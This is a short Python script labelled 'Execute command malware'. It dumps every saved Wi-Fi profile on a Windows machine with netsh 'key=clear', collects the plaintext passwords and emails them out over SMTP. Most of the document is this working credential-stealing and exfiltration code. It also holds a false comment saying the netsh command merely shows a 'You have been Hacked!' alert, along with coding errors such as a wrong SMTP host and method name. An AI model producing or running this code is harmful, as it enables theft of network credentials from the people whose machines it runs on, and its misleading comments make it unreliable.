#!/usr/share/python3

import subprocess
import smtplib         # This has been called to send E-mails from the python script
import re

# Execute command malware

# Getting stored wifi passwords from Windos OS
# netsh wlan show profile
# netsh wlan show profile <profile_name> key=clear

def send_mail(email, password, message):

    server = smtplib.SMTP("smtp.google.com", 587)   # "smtp.google.com" is the server that will allows us to send mails. Google allows there servers to be used to send mails
                                # And this service works on port 587 in the server
    server.starttls()                               # Initiate a tls connection using the sever that has been created
    server.login(email, password)                   # Login to the server
    server.send_mail(email, email, message)         # server.send_mail(<from_mail_address>, <to_mail_address>, <message>) 
                                # Here I want to send the mail to myself so the <from_mail_address> and <to_mail_address> is the same
    server.quit()                                   # At last stop the server

command = "netsh wlan show profile"          # This command works on Windows OS and just throws a alert box saying "You have been Hacked!"
#subprocess.Popen(command, shell=True)            # .Popen executes the given command and doesn't wait for the whole command to execute. It just runs the command and
                                                 # and continues to program execution

networks = subprocess.check_output(command, shell=True)       # The subprocess.check_output() does not display any output but stores the output in itself after command execution
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", networks)  # re.findall() will search for all matching strings and will store it as a list

result = ""

for network_name in network_name_list:

    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("<e-mail>", "<password>", result)
